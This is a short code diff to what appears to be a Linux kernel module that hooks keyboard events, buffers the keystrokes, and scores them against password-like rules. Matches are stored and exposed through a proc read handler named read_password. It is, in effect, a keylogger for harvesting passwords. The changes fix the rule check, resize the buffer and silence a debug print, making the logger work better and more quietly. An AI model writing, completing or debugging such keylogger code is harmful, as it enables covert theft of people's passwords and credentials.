@@ -129,7 +129,7 @@ void check_pw(char* pw, int len){
 			reject = 1;
 		}
 	}
-	if(rules[0] += rules[1] += rules[2] += rules[3] > 2 && !reject){ // At least 3 are correct
+	if(rules[0] + rules[1] + rules[2] + rules[3] > 2 && !reject){ // At least 3 are correct
 		push(&HEAD, pw);
 		printk("PUSHING\n");
 	}
@@ -144,7 +144,7 @@ struct proc_ops proc_fops = {
 	proc_read: read_password,
 };
 //doesn't like when it gets to the limit here
-char pw_buffer[1000];
+char pw_buffer[16];
 
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
 	int len;
@@ -156,7 +156,7 @@ int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data)
 
 	if(kp->down){
 		len = strlen(pw_buffer);
-		printk("length of the buffer: %d\n", len);
+		//printk("length of the buffer: %d\n", len);
 		if(len == 15 || kp->value == 57 || kp->value == 28){ // reset it on a space and newline as well
 			check_pw(pw_buffer, len);
 			CLEAR_BUFFER(pw_buffer, len);
